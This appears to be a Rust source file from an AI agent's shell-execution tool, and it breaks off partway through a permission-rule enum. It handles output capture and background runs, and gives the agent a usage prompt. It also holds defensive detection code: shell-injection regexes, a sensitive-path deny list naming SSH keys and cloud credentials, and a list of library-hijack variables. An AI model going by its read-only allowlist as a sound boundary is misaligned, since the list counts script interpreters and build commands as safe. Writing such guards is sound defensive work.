use std::collections::HashMap;

use async_trait::async_trait;
use fastclaw_core::tool::{Tool, ToolKind, ToolParameterSchema, ToolProgressUpdate, ToolResult, ProgressSender};

/// Default output truncation limit (raised from 8KB to 64KB to capture more useful output).
const DEFAULT_MAX_OUTPUT_BYTES: usize = 65536;

/// Threshold: if combined stdout+stderr exceeds this, write to a terminal file
/// and return a compact summary instead of full output in context.
const TERMINAL_FILE_THRESHOLD: usize = 800;

/// Truncate output string at a char boundary, adding a note about total size.
fn truncate_output(s: &str, max_bytes: usize) -> String {
    if s.len() <= max_bytes {
        return s.to_string();
    }
    let end = s
        .char_indices()
        .map(|(i, _)| i)
        .take_while(|&i| i <= max_bytes)
        .last()
        .unwrap_or(0);
    format!("{}... [truncated, {} bytes total]", &s[..end], s.len())
}

/// Write shell output to a persistent terminal file and return a compact
/// summary for the LLM context. The full output is retrievable via
/// `read_file` or `grep` on the returned path.
///
/// Inspired by Cursor's approach: long shell output is written to files,
/// keeping context lean while the agent can search/tail for details.
fn write_terminal_file(command: &str, stdout: &str, stderr: &str, exit_code: i32) -> Option<String> {
    let dir = std::env::temp_dir().join("fastclaw_terminals");
    if std::fs::create_dir_all(&dir).is_err() {
        return None;
    }
    let ts = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_millis())
        .unwrap_or(0);
    let filename = format!("shell_{ts}.txt");
    let path = dir.join(&filename);

    let mut content = String::new();
    content.push_str(&format!("--- command: {} ---\n", command));
    content.push_str(&format!("--- exit_code: {} ---\n", exit_code));
    content.push_str(&format!("--- stdout ({} lines, {} bytes) ---\n", stdout.lines().count(), stdout.len()));
    content.push_str(stdout);
    if !stdout.ends_with('\n') && !stdout.is_empty() {
        content.push('\n');
    }
    if !stderr.is_empty() {
        content.push_str(&format!("--- stderr ({} lines, {} bytes) ---\n", stderr.lines().count(), stderr.len()));
        content.push_str(stderr);
        if !stderr.ends_with('\n') {
            content.push('\n');
        }
    }

    match std::fs::write(&path, &content) {
        Ok(()) => Some(path.to_string_lossy().to_string()),
        Err(_) => None,
    }
}

/// Build a compact LLM-friendly summary of shell output, referencing a file
/// for the full content. Keeps only the last few lines (tail) which typically
/// contain the final status, errors, or results.
fn compact_shell_summary(stdout: &str, stderr: &str, exit_code: i32, file_path: &str) -> String {
    let stdout_lines: Vec<&str> = stdout.lines().collect();
    let stderr_lines: Vec<&str> = stderr.lines().collect();
    let total_lines = stdout_lines.len() + stderr_lines.len();
    let total_bytes = stdout.len() + stderr.len();

    let mut summary = String::new();
    summary.push_str(&format!("exit_code={exit_code}, {total_lines} lines, {total_bytes} bytes\n"));

    let tail_count = 15;
    if !stderr.is_empty() && exit_code != 0 {
        let tail: Vec<&str> = stderr_lines.iter().rev().take(tail_count).rev().copied().collect();
        summary.push_str("stderr (last lines):\n");
        for line in tail {
            summary.push_str(line);
            summary.push('\n');
        }
    }
    if !stdout.is_empty() {
        let tail: Vec<&str> = stdout_lines.iter().rev().take(tail_count).rev().copied().collect();
        summary.push_str("stdout (last lines):\n");
        for line in tail {
            summary.push_str(line);
            summary.push('\n');
        }
    }

    summary.push_str(&format!(
        "\n[Full output saved to: {file_path} — use read_file or grep to inspect]"
    ));
    summary
}

/// Process shell output: if large, write to file and return compact summary;
/// otherwise return the full output inline.
fn process_shell_output(command: &str, stdout: &str, stderr: &str, exit_code: i32) -> (String, Option<String>) {
    let combined_size = stdout.len() + stderr.len();

    if combined_size <= TERMINAL_FILE_THRESHOLD {
        let inline = serde_json::json!({
            "exit_code": exit_code,
            "stdout": stdout,
            "stderr": stderr,
        });
        return (inline.to_string(), None);
    }

    let file_path = write_terminal_file(command, stdout, stderr, exit_code);
    match file_path {
        Some(ref path) => {
            let summary = compact_shell_summary(stdout, stderr, exit_code, path);
            (summary, file_path)
        }
        None => {
            let truncated_stdout = truncate_output(stdout, DEFAULT_MAX_OUTPUT_BYTES);
            let truncated_stderr = truncate_output(stderr, DEFAULT_MAX_OUTPUT_BYTES);
            let inline = serde_json::json!({
                "exit_code": exit_code,
                "stdout": truncated_stdout,
                "stderr": truncated_stderr,
            });
            (inline.to_string(), None)
        }
    }
}

/// Detect the preferred shell on Unix (bash if available, else sh).
#[cfg(not(windows))]
fn preferred_shell() -> &'static str {
    use std::sync::OnceLock;
    static SHELL: OnceLock<&str> = OnceLock::new();
    SHELL.get_or_init(|| {
        if std::path::Path::new("/bin/bash").exists()
            || std::path::Path::new("/usr/bin/bash").exists()
        {
            "bash"
        } else {
            "sh"
        }
    })
}

/// Check if Linux namespace isolation (unshare) is available on this system.
/// Returns true if `unshare` binary exists and user namespaces are permitted.
#[cfg(not(windows))]
pub fn namespace_available() -> bool {
    use std::sync::OnceLock;
    static AVAILABLE: OnceLock<bool> = OnceLock::new();
    *AVAILABLE.get_or_init(|| {
        // Check if unshare binary exists
        let unshare_exists = std::process::Command::new("unshare")
            .arg("--help")
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .status()
            .map(|s| s.success())
            .unwrap_or(false);
        if !unshare_exists {
            return false;
        }
        // Check if user namespaces are enabled (try a no-op unshare)
        std::process::Command::new("unshare")
            .args(["--user", "--map-root-user", "--", "true"])
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .status()
            .map(|s| s.success())
            .unwrap_or(false)
    })
}

/// Single-quote a string for safe inclusion in shell commands.
fn shell_quote(s: &str) -> String {
    format!("'{}'", s.replace('\'', "'\\''"))
}

/// Detect whether PowerShell Core (`pwsh`) is available; fall back to `powershell`.
#[cfg(windows)]
fn powershell_exe() -> &'static str {
    use std::sync::OnceLock;
    static PS: OnceLock<&str> = OnceLock::new();
    *PS.get_or_init(|| {
        if std::process::Command::new("pwsh")
            .arg("--version")
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .status()
            .is_ok()
        {
            "pwsh"
        } else {
            "powershell"
        }
    })
}

/// Build a `tokio::process::Command` for the given shell and command string.
/// `shell_hint` is the optional "shell" parameter from tool arguments.
fn build_shell_command(command: &str, shell_hint: Option<&str>) -> tokio::process::Command {
    #[cfg(windows)]
    {
        match shell_hint {
            Some("powershell") | Some("pwsh") => {
                let exe = powershell_exe();
                let mut c = tokio::process::Command::new(exe);
                c.args(["-NoProfile", "-NonInteractive", "-Command", command]);
                c.creation_flags(0x08000000); // CREATE_NO_WINDOW
                c
            }
            _ => {
                let mut c = tokio::process::Command::new("cmd.exe");
                c.args(["/C", command]);
                c.creation_flags(0x08000000);
                c
            }
        }
    }
    #[cfg(not(windows))]
    {
        let shell = match shell_hint {
            Some("sh") => "sh",
            Some("bash") => "bash",
            _ => preferred_shell(),
        };
        let mut c = tokio::process::Command::new(shell);
        c.arg("-c").arg(command);
        c
    }
}

/// Build common shell parameter schema.
fn shell_parameter_schema(include_is_background: bool) -> ToolParameterSchema {
    let mut props = HashMap::new();
    props.insert(
        "command".to_string(),
        serde_json::json!({
            "type": "string",
            "description": "The shell command to execute."
        }),
    );
    props.insert(
        "description".to_string(),
        serde_json::json!({
            "type": "string",
            "description": "Optional brief description of the command's purpose, shown to the user."
        }),
    );
    props.insert(
        "working_dir".to_string(),
        serde_json::json!({
            "type": "string",
            "description": "Optional working directory (relative to project root or absolute). Must exist."
        }),
    );
    props.insert(
        "shell".to_string(),
        serde_json::json!({
            "type": "string",
            "enum": ["bash", "sh", "cmd", "powershell"],
            "description": "Shell to use. On Windows: 'cmd' (default) or 'powershell'. \
             On Unix: 'bash' (default) or 'sh'. Omit to use the platform default."
        }),
    );
    if include_is_background {
        props.insert(
            "is_background".to_string(),
            serde_json::json!({
                "type": "boolean",
                "description": "Whether to run the command in background. Required. \
                 Set true for long-running processes (dev servers, watchers, daemons). \
                 Set false for one-time commands that should complete before proceeding."
            }),
        );
    }
    let mut required = vec!["command".to_string()];
    if include_is_background {
        required.push("is_background".to_string());
    }
    ToolParameterSchema {
        schema_type: "object".to_string(),
        properties: props,
        required,
    }
}

/// Execute a shell command and return stdout/stderr.
pub struct ShellTool {
    timeout_secs: u64,
}

impl ShellTool {
    pub fn new(timeout_secs: u64) -> Self {
        Self { timeout_secs }
    }
}

const SHELL_TOOL_PROMPT: &str = "\
Run a shell command in the user's environment.

## When to Use

Use this tool ONLY when no specialized tool can accomplish the task:
- Reading files → use `read_file` instead of `cat`
- Editing files → use `edit_file` instead of `sed`/`awk`
- Searching file contents → use `search_in_files` instead of `grep`/`rg`
- Finding files by name → use `glob` instead of `find`
- Listing directories → use `list_directory` instead of `ls`
- Writing files → use `write_file` instead of `echo >` or `cat <<EOF`

Specialized tools are faster, produce structured output, and avoid shell escaping pitfalls.

## Command Execution Rules

### Multiple Commands

Chain dependent commands with `&&`:
```
cd /path && cargo build && cargo test
```
Use `;` only when you don't care if earlier commands fail.

For INDEPENDENT commands that can run in parallel, make separate tool calls \
in the same response — don't chain them with `&&`.

### Quoting and Paths

ALWAYS double-quote file paths that may contain spaces:
```
cat \"/path/with spaces/file.txt\"    # correct
cat /path/with spaces/file.txt        # WRONG — will fail
```

### Working Directory

Use the `working_directory` parameter to run in a specific directory rather than `cd`:
```json
{\"command\": \"npm install\", \"working_directory\": \"/path/to/project\"}
```

## Git Operations

### Commit Rules
- NEVER update the git config
- NEVER use `--no-verify` or `--no-gpg-sign` unless explicitly asked
- NEVER run `git push --force` to main/master — warn the user
- NEVER run destructive git operations (hard reset, force push) without confirmation
- Prefer creating a NEW commit over `--amend` unless all conditions are met:
  1. User explicitly requested amend, OR pre-commit hook auto-modified files
  2. HEAD commit was created by you in this conversation
  3. Commit has NOT been pushed to remote
- For commit messages, use a HEREDOC to preserve formatting:
  ```
  git commit -m \"$(cat <<'EOF'
  feat: add user authentication

  Implements JWT-based auth with refresh tokens.
  EOF
  )\"
  ```

### Branch Safety
- NEVER skip pre-commit hooks
- Check `git status` before committing
- Use `git diff` to review changes before commit

## Background Commands

Set `is_background: true` for:
- Dev servers (`npm run dev`, `cargo watch`)
- File watchers
- Any long-running process you don't need to wait for

Set `is_background: false` (default) for:
- Build commands
- Test suites
- One-off scripts
- Commands where you need the output

Timeout for foreground commands: 5 minutes. For longer tasks, use background mode \
with output redirection, then poll results.

## Sleep and Polling

Use `sleep` in shell pipelines when appropriate:
```
sleep 30 && cat build-output.txt
```

Do NOT use sleep between separate tool calls — the system handles timing.
Do NOT spin-wait in a loop. Use background mode + periodic polling.

## Anti-Patterns

- Don't use `cat` to read files — use `read_file`
- Don't use `echo` to communicate — write your response in text
- Don't use `grep` for searching — use `search_in_files`
- Don't use `sed`/`awk` to edit files — use `edit_file`
- Don't pipe long output through `head`/`tail` — use `read_file` with offset/limit
- Don't use `find` — use `glob`
- Don't use interactive commands (`vim`, `nano`, `less`, `top`)
- Don't run commands that require user input (stdin)

## Output

- stdout/stderr truncated at ~64KB
- Non-zero exit codes are returned as tool errors
- For very large output, redirect to a file and use `read_file`";

#[async_trait]
impl Tool for ShellTool {
    fn kind(&self) -> ToolKind { ToolKind::Execute }
    fn name(&self) -> &str {
        "shell_exec"
    }

    fn description(&self) -> &str {
        "Run a shell command. Returns exit_code, stdout, stderr, and signal info. \
         Default shell: bash (Unix) or cmd.exe (Windows). \
         Use the 'shell' parameter to choose: 'bash'/'sh' on Unix, 'cmd'/'powershell' on Windows. \
         Set is_background=true for dev servers, watchers, and processes you don't need to wait for; \
         set is_background=false for commands you want to wait for (timeout: 5 minutes). \
         stdout/stderr truncated at ~64KB. Non-zero exit_code returned as tool error. \
         For very long tasks (>5min), use background mode with output redirection, \
         then poll with 'sleep N' + 'read_file' to monitor progress. \
         For moderate tasks (builds, tests) that run under 5min, foreground mode is fine — \
         use 'sleep' freely in shell pipelines (e.g. 'sleep 30 && cat result.txt')."
    }

    fn prompt(&self) -> String {
        SHELL_TOOL_PROMPT.to_string()
    }

    fn parameters_schema(&self) -> ToolParameterSchema {
        shell_parameter_schema(true)
    }

    fn supports_progress(&self) -> bool { true }

    fn max_result_size_chars(&self) -> usize { 30_000 }

    async fn execute(&self, arguments: &str) -> ToolResult {
        self.execute_shell(arguments, None).await
    }

    async fn execute_with_progress(
        &self,
        arguments: &str,
        progress: ProgressSender,
    ) -> ToolResult {
        self.execute_shell(arguments, Some(progress)).await
    }
}

impl ShellTool {
    async fn execute_shell(&self, arguments: &str, progress: Option<ProgressSender>) -> ToolResult {
        let args: serde_json::Value = match serde_json::from_str(arguments) {
            Ok(v) => v,
            Err(e) => return ToolResult::err(format!(
                "shell_exec arguments are not valid JSON: {e}. \
                 Pass {{\"command\": \"...\", \"is_background\": false}} with optional \"working_dir\", \"description\"."
            )),
        };

        let command = match args.get("command").and_then(|v| v.as_str()) {
            Some(s) => s,
            None => return ToolResult::err(
                "shell_exec is missing string field 'command'. \
                 Example: {\"command\": \"ls -la\", \"is_background\": false}."
                    .to_string(),
            ),
        };

        let is_background = args
            .get("is_background")
            .and_then(|v| v.as_bool())
            .unwrap_or(false);

        let user_confirmed = args
            .get("confirmed")
            .and_then(|v| v.as_bool())
            .unwrap_or(false);

        if !user_confirmed {
            match fastclaw_security::dangerous_ops::check_dangerous_command(command) {
                Ok(()) => {}
                Err(fastclaw_security::dangerous_ops::CheckResult::Denied(msg))
                | Err(fastclaw_security::dangerous_ops::CheckResult::NeedsConfirmation(msg)) => {
                    return ToolResult::needs_confirm(format!(
                        "This command requires user confirmation: {msg}"
                    ));
                }
            }
        }

        let shell_hint = args.get("shell").and_then(|v| v.as_str());
        let mut cmd = build_shell_command(command, shell_hint);

        if let Some(dir) = args.get("working_dir").and_then(|v| v.as_str()) {
            cmd.current_dir(dir);
        }

        cmd.env("FASTCLAW_AGENT", "1");

        cmd.stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped());

        let timeout = tokio::time::Duration::from_secs(self.timeout_secs);

        if is_background {
            match cmd.spawn() {
                Ok(mut child) => {
                    let pid = child.id();
                    let desc = args.get("description").and_then(|v| v.as_str()).unwrap_or(command);
                    let cmd_for_log = command.to_string();
                    tokio::spawn(async move {
                        match child.wait().await {
                            Ok(status) => tracing::debug!(
                                pid, command = %cmd_for_log,
                                exit_code = status.code(),
                                "background shell command exited"
                            ),
                            Err(e) => tracing::warn!(
                                pid, command = %cmd_for_log,
                                error = %e,
                                "background shell command wait failed"
                            ),
                        }
                    });
                    ToolResult::ok(
                        serde_json::json!({
                            "background": true,
                            "pid": pid,
                            "command": command,
                            "description": desc,
                        })
                        .to_string(),
                    )
                }
                Err(e) => ToolResult::err(format!("shell_exec spawn failed: {e}")),
            }
        } else if progress.is_some() {
            self.execute_with_streaming(cmd, command, timeout, progress.unwrap()).await
        } else {
            match tokio::time::timeout(timeout, cmd.output()).await {
                Ok(Ok(output)) => {
                    let stdout = String::from_utf8_lossy(&output.stdout);
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    let code = output.status.code().unwrap_or(-1);

                    let (llm_out, terminal_file) = process_shell_output(command, &stdout, &stderr, code);

                    let full_display = serde_json::json!({
                        "exit_code": code,
                        "stdout": truncate_output(&stdout, DEFAULT_MAX_OUTPUT_BYTES),
                        "stderr": truncate_output(&stderr, DEFAULT_MAX_OUTPUT_BYTES),
                        "terminal_file": terminal_file,
                    }).to_string();

                    if code == 0 {
                        ToolResult::ok_split(llm_out, full_display)
                    } else {
                        ToolResult::err(llm_out)
                    }
                }
                Ok(Err(e)) => ToolResult::err(format!(
                    "shell_exec spawn failed: {e}"
                )),
                Err(_) => ToolResult::err(format!(
                    "shell_exec timed out after {}s, command killed.",
                    self.timeout_secs
                )),
            }
        }
    }

    async fn execute_with_streaming(
        &self,
        mut cmd: tokio::process::Command,
        command: &str,
        timeout: tokio::time::Duration,
        progress: ProgressSender,
    ) -> ToolResult {
        use tokio::io::{AsyncBufReadExt, BufReader};

        let mut child = match cmd.spawn() {
            Ok(c) => c,
            Err(e) => return ToolResult::err(format!("shell_exec spawn failed: {e}")),
        };

        let stdout = child.stdout.take();
        let stderr = child.stderr.take();

        let progress_clone = progress.clone();
        let stdout_task = tokio::spawn(async move {
            let mut lines = Vec::new();
            if let Some(out) = stdout {
                let mut reader = BufReader::new(out).lines();
                while let Ok(Some(line)) = reader.next_line().await {
                    lines.push(line.clone());
                    let count = lines.len();
                    if count % 10 == 0 || count <= 5 {
                        let _ = progress_clone.send(ToolProgressUpdate {
                            message: format!("stdout: {} lines", count),
                            progress: None,
                            partial_output: Some(
                                lines.iter().rev().take(5).rev()
                                    .cloned().collect::<Vec<_>>().join("\n")
                            ),
                        }).await;
                    }
                }
            }
            lines.join("\n")
        });

        let stderr_task = tokio::spawn(async move {
            let mut lines = Vec::new();
            if let Some(err) = stderr {
                let mut reader = BufReader::new(err).lines();
                while let Ok(Some(line)) = reader.next_line().await {
                    lines.push(line);
                }
            }
            lines.join("\n")
        });

        let wait_result = tokio::time::timeout(timeout, async {
            let stdout_out = stdout_task.await.unwrap_or_default();
            let stderr_out = stderr_task.await.unwrap_or_default();
            let status = child.wait().await;
            (stdout_out, stderr_out, status)
        }).await;

        match wait_result {
            Ok((stdout_out, stderr_out, Ok(status))) => {
                let code = status.code().unwrap_or(-1);
                let total_lines = stdout_out.lines().count() + stderr_out.lines().count();

                let _ = progress.send(ToolProgressUpdate {
                    message: format!("completed: exit_code={code}, {total_lines} total lines"),
                    progress: Some(1.0),
                    partial_output: None,
                }).await;

                let (llm_out, terminal_file) = process_shell_output(command, &stdout_out, &stderr_out, code);

                let full_display = serde_json::json!({
                    "exit_code": code,
                    "stdout": truncate_output(&stdout_out, DEFAULT_MAX_OUTPUT_BYTES),
                    "stderr": truncate_output(&stderr_out, DEFAULT_MAX_OUTPUT_BYTES),
                    "terminal_file": terminal_file,
                }).to_string();

                if code == 0 {
                    ToolResult::ok_split(llm_out, full_display)
                } else {
                    ToolResult::err(llm_out)
                }
            }
            Ok((_, _, Err(e))) => ToolResult::err(format!("shell_exec wait failed: {e}")),
            Err(_) => {
                let _ = child.kill().await;
                ToolResult::err(format!(
                    "shell_exec timed out after {}s, command killed.",
                    self.timeout_secs
                ))
            }
        }
    }
}
// --- Shell Injection Detection ---

/// Patterns that indicate shell injection / command substitution.
/// Each entry: (regex_pattern, human description).
/// Applied to the command text after single-quoted regions are stripped.
const INJECTION_PATTERNS: &[(&str, &str)] = &[
    (r"\$\(", "$() command substitution"),
    (r"\$\{[^}]*[!:/#%]", "${} dangerous parameter expansion"),
    (r"<\(", "process substitution <()"),
    (r">\(", "process substitution >()"),
    (r"=\(", "Zsh process substitution =()"),
    (r"\$\[", "$[] legacy arithmetic expansion"),
    (r"(?:^|[\s;&|])=[a-zA-Z_]", "Zsh equals expansion (=cmd)"),
];

/// Commands considered safe (read-only) for Plan mode execution.
/// These commands only read information and do not modify state.
const READONLY_COMMANDS: &[&str] = &[
    // File inspection
    "ls", "ll", "la", "dir", "exa", "eza", "lsd",
    "cat", "bat", "head", "tail", "less", "more",
    "wc", "file", "stat", "du", "df",
    // Search
    "grep", "rg", "ag", "ack", "fgrep", "egrep",
    "find", "fd", "fdfind", "locate", "which", "whereis", "type",
    // Text processing (readonly)
    "sort", "uniq", "tr", "cut", "paste", "column",
    "awk", "sed", // Only readonly when no -i flag (checked separately)
    "diff", "comm", "cmp",
    "jq", "yq", "xq",
    // System info
    "echo", "printf", "date", "whoami", "hostname", "uname",
    "env", "printenv", "id", "groups",
    "ps", "top", "htop", "free", "uptime", "lsof",
    "pwd", "realpath", "dirname", "basename",
    // Development tools (read-only subcommands handled separately)
    "tree", "tokei", "cloc", "scc",
    "python3", "python", "node", "ruby", // Script execution for queries
    "cargo", // Subcommand checked separately
    "npm", "npx", "yarn", "pnpm", // Subcommand checked separately
    "git", // Subcommand checked separately
    "gh", // Subcommand checked separately
    "docker", // Subcommand checked separately
    "kubectl", // Subcommand checked separately
    "rustc", "gcc", "g++", "clang", // Compilation is treated as read since it doesn't modify source
    "make", // Build is read-only from source perspective
    "test", "[",
    "true", "false",
    "sleep",
    "xargs", // Only safe with readonly sub-commands (checked via pipeline)
];

/// Git subcommands that are read-only.
const GIT_READONLY_SUBCOMMANDS: &[&str] = &[
    "status", "log", "diff", "show", "branch", "tag",
    "describe", "shortlog", "blame", "ls-files", "ls-tree",
    "rev-parse", "rev-list", "remote", "config",
    "stash", // stash list/show are readonly; stash pop/apply are not but common enough
];

/// Cargo subcommands that are read-only.
const CARGO_READONLY_SUBCOMMANDS: &[&str] = &[
    "check", "clippy", "test", "bench", "doc",
    "tree", "metadata", "pkgid", "verify-project",
    "version", "help", "search",
];

/// npm/yarn/pnpm subcommands that are read-only.
const NPM_READONLY_SUBCOMMANDS: &[&str] = &[
    "list", "ls", "info", "show", "view", "outdated",
    "audit", "explain", "why", "help", "version",
    "test", "run", // run scripts are common in development
];

/// Docker subcommands that are read-only.
const DOCKER_READONLY_SUBCOMMANDS: &[&str] = &[
    "ps", "images", "inspect", "logs", "stats", "top",
    "port", "diff", "history", "version", "info",
];

/// Classify whether a single command segment is readonly.
/// Returns Ok(()) if the command is readonly, Err(reason) if it's a write/dangerous command.
fn classify_readonly(segment: &str) -> Result<(), String> {
    let trimmed = segment.trim();
    if trimmed.is_empty() {
        return Ok(());
    }

    // Output redirection → write operation
    if has_output_redirection(trimmed) {
        return Err("output redirection (> or >>) makes this a write operation".into());
    }

    let tokens: Vec<&str> = trimmed.split_whitespace().collect();
    if tokens.is_empty() {
        return Ok(());
    }

    let base_cmd = tokens[0].rsplit('/').next().unwrap_or(tokens[0]);

    // Special handling for commands with subcommands
    if base_cmd == "git" {
        return classify_git_readonly(&tokens[1..]);
    }
    if base_cmd == "cargo" {
        return classify_subcommand_readonly(&tokens[1..], CARGO_READONLY_SUBCOMMANDS, "cargo");
    }
    if matches!(base_cmd, "npm" | "npx" | "yarn" | "pnpm") {
        return classify_subcommand_readonly(&tokens[1..], NPM_READONLY_SUBCOMMANDS, base_cmd);
    }
    if base_cmd == "docker" {
        return classify_subcommand_readonly(&tokens[1..], DOCKER_READONLY_SUBCOMMANDS, "docker");
    }

    // sed -i is a write operation
    if base_cmd == "sed" && tokens.iter().any(|t| *t == "-i" || t.starts_with("-i")) {
        return Err("sed -i modifies files in place".into());
    }

    if READONLY_COMMANDS.contains(&base_cmd) {
        return Ok(());
    }

    Err(format!("command '{base_cmd}' is not in the read-only allowlist"))
}

fn classify_git_readonly(args: &[&str]) -> Result<(), String> {
    let subcommand = args.iter()
        .find(|a| !a.starts_with('-'))
        .copied()
        .unwrap_or("");

    if subcommand.is_empty() || GIT_READONLY_SUBCOMMANDS.contains(&subcommand) {
        Ok(())
    } else {
        Err(format!("git {subcommand} is not a read-only git operation"))
    }
}

fn classify_subcommand_readonly(args: &[&str], allowed: &[&str], parent: &str) -> Result<(), String> {
    let subcommand = args.iter()
        .find(|a| !a.starts_with('-'))
        .copied()
        .unwrap_or("");

    if subcommand.is_empty() || allowed.contains(&subcommand) {
        Ok(())
    } else {
        Err(format!("{parent} {subcommand} is not a read-only operation"))
    }
}

/// Check if a command segment contains output redirection (> or >>).
/// Skips redirections inside quotes.
fn has_output_redirection(s: &str) -> bool {
    let stripped = strip_single_quoted_regions(s);
    let bytes = stripped.as_bytes();
    let len = bytes.len();
    let mut i = 0;
    while i < len {
        if bytes[i] == b'>' {
            // Skip 2> (stderr redirect, informational)
            if i > 0 && bytes[i - 1] == b'2' {
                i += 1;
                continue;
            }
            // Skip >( (process substitution)
            let next = if bytes[i + 1..].first() == Some(&b'>') { i + 2 } else { i + 1 };
            if next < len && bytes[next] == b'(' {
                i = next + 1;
                continue;
            }
            return true;
        }
        i += 1;
    }
    false
}

/// Validate that a full command (with pipes and chains) is entirely readonly.
/// Every segment in pipes (|), AND (&&), OR (||), and semicolons (;) must be readonly.
pub fn validate_readonly_command(command: &str) -> Result<(), String> {
    // Split on pipe first, then on chain operators within each pipe segment
    for pipe_segment in command.split('|') {
        let pipe_seg = pipe_segment.trim();
        if pipe_seg.is_empty() {
            continue;
        }
        // Further split on && || ;
        for part in pipe_seg
            .split("&&")
            .flat_map(|s| s.split("||"))
            .flat_map(|s| s.split(';'))
        {
            classify_readonly(part)?;
        }
    }
    Ok(())
}

// ─── Path Safety Validation ─────────────────────────────────────────────────

/// Sensitive paths under $HOME that should never be written to by shell commands.
const SENSITIVE_HOME_PATHS: &[&str] = &[
    ".ssh",
    ".gnupg",
    ".gpg",
    ".bashrc",
    ".bash_profile",
    ".bash_login",
    ".profile",
    ".zshrc",
    ".zshenv",
    ".zprofile",
    ".zlogin",
    ".config/git/credentials",
    ".gitconfig",
    ".npmrc",
    ".cargo/credentials",
    ".cargo/credentials.toml",
    ".aws/credentials",
    ".kube/config",
    ".docker/config.json",
    ".netrc",
    ".env",
    ".fastclaw",
];

/// Commands known to write/modify files (for which path validation applies).
const PATH_WRITE_COMMANDS: &[&str] = &[
    "rm", "rmdir", "mv", "cp", "touch", "mkdir",
    "chmod", "chown", "chgrp",
    "ln", "unlink",
    "tee",
];

/// Extract file path arguments from a command string for validation.
/// Returns (base_command, list of path arguments).
fn extract_paths_from_command(segment: &str) -> (String, Vec<String>) {
    let tokens: Vec<&str> = segment.split_whitespace().collect();
    if tokens.is_empty() {
        return (String::new(), Vec::new());
    }

    let base_cmd = tokens[0].rsplit('/').next().unwrap_or(tokens[0]).to_string();
    let args = &tokens[1..];

    let mut paths = Vec::new();
    let mut after_double_dash = false;

    for (i, &arg) in args.iter().enumerate() {
        if arg == "--" {
            after_double_dash = true;
            continue;
        }
        if after_double_dash {
            paths.push(arg.to_string());
            continue;
        }
        if arg.starts_with('-') {
            // Skip flags and their arguments for known flag-with-value patterns
            if matches!(arg, "-o" | "-t" | "--target-directory" | "--output") {
                // next token is the value — include it as a path since it's an output target
                if let Some(&next) = args.get(i + 1) {
                    paths.push(next.to_string());
                }
            }
            continue;
        }
        paths.push(arg.to_string());
    }

    (base_cmd, paths)
}

/// Check if a path resolves to a sensitive location that should be protected.
/// `home_dir` is the user's home directory.
fn is_sensitive_path(path: &std::path::Path, home_dir: &std::path::Path) -> Option<String> {
    for sensitive in SENSITIVE_HOME_PATHS {
        let sensitive_full = home_dir.join(sensitive);
        if path == sensitive_full || path.starts_with(&sensitive_full) {
            return Some(format!(
                "path '{}' targets sensitive location ~/{sensitive}",
                path.display()
            ));
        }
    }
    None
}

/// Check if a path contains traversal patterns that might escape allowed directories.
fn has_traversal_attempt(raw_path: &str) -> bool {
    let normalized = raw_path.replace('\\', "/");
    normalized.contains("/../")
        || normalized.starts_with("../")
        || normalized.ends_with("/..")
        || normalized == ".."
}

/// Validate paths extracted from a command against security rules.
/// Only applies to write commands (rm, mv, cp, touch, etc.) since read commands
/// are bounded by the OS file permissions and the sandbox directory restriction.
pub fn validate_command_paths(command: &str, allowed_dirs: &[String]) -> Result<(), String> {
    let stripped = strip_single_quoted_regions(command);

    for segment in stripped
        .split("&&")
        .flat_map(|s| s.split("||"))
        .flat_map(|s| s.split(';'))
        .flat_map(|s| s.split('|'))
    {
        let seg = segment.trim();
        if seg.is_empty() {
            continue;
        }

        let (base_cmd, paths) = extract_paths_from_command(seg);

        // Only validate paths for write commands
        if !PATH_WRITE_COMMANDS.contains(&base_cmd.as_str()) {
            // Also check sed -i (write via in-place edit)
            if base_cmd == "sed" {
                let tokens: Vec<&str> = seg.split_whitespace().collect();
                if !tokens.iter().any(|t| *t == "-i" || t.starts_with("-i")) {
                    continue;
                }
            } else {
                continue;
            }
        }

        let home_dir = dirs::home_dir().unwrap_or_else(|| std::path::PathBuf::from("/root"));

        for raw_path in &paths {
            // Strip surrounding quotes
            let cleaned = raw_path.trim_matches(|c| c == '\'' || c == '"');

            // 1. Check traversal attempt
            if has_traversal_attempt(cleaned) {
                return Err(format!(
                    "path traversal detected in '{cleaned}' — canonicalize paths or use absolute paths within the workspace"
                ));
            }

            // 2. Resolve path for sensitive-path check
            let expanded = if cleaned.starts_with('~') {
                home_dir.join(cleaned.trim_start_matches("~/").trim_start_matches('~'))
            } else if cleaned.starts_with('/') {
                std::path::PathBuf::from(cleaned)
            } else {
                // Relative path — try to resolve it; if allowed_dirs is set use first as base
                let base = allowed_dirs.first()
                    .map(std::path::PathBuf::from)
                    .unwrap_or_else(|| std::env::current_dir().unwrap_or_else(|_| std::path::PathBuf::from(".")));
                base.join(cleaned)
            };

            // 3. Check sensitive path
            if let Some(reason) = is_sensitive_path(&expanded, &home_dir) {
                return Err(reason);
            }

            // 4. If allowed_dirs is configured, verify the path is within bounds
            if !allowed_dirs.is_empty() {
                let canonical = expanded.canonicalize().unwrap_or(expanded.clone());
                let in_allowed = allowed_dirs.iter().any(|d| {
                    let allowed = std::path::Path::new(d);
                    let allowed_c = allowed.canonicalize().unwrap_or_else(|_| allowed.to_path_buf());
                    canonical.starts_with(&allowed_c)
                });
                if !in_allowed {
                    return Err(format!(
                        "path '{}' resolves outside allowed directories: {}",
                        cleaned,
                        allowed_dirs.join(", ")
                    ));
                }
            }
        }
    }
    Ok(())
}

// ─── Permission Rule Engine ─────────────────────────────────────────────────

/// Environment variables that indicate binary hijack attempts.
/// These MUST NOT be stripped before rule matching.
const BINARY_HIJACK_VARS: &[&str] = &[
    "PATH", "LD_PRELOAD", "LD_LIBRARY_PATH", "DYLD_INSERT_LIBRARIES",
    "DYLD_LIBRARY_PATH", "DYLD_FRAMEWORK_PATH",
];

/// Wrapper commands that are safe to strip before permission matching.
const SAFE_WRAPPERS: &[&str] = &[
    "timeout", "time", "nice", "nohup", "stdbuf", "env",
];

/// A parsed permission rule for shell commands.
#[derive(Debug, Clone, PartialEq)]
pub enum PermissionRule {
    /// Exact command match (e.g., "git status")
    Exact(String),
    /// Prefix match (e.g., "git:*" matches "git status", "git diff", etc.)
    Prefix(String),
